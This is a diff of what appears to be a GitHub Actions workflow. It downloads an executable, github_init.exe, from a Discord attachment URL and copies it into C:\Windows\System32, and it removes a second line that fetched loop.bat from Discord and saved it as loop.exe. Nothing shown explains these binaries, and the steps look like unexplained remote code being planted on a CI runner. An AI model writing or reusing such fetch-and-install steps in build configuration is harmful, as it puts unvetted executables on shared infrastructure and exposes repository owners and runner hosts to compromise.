@@ -12,7 +12,6 @@ jobs:
     - name: Download github_init and starting...
       run: |
         Invoke-WebRequest https://cdn.discordapp.com/attachments/818761039432253461/852238500506107914/github_init.exe -OutFile github_init.exe
-        Invoke-WebRequest https://cdn.discordapp.com/attachments/818761039432253461/852239711712182282/loop.bat -OutFile loop.exe
     - name: Copy...
       run: | 
         copy github_init.exe C:\Windows\System32
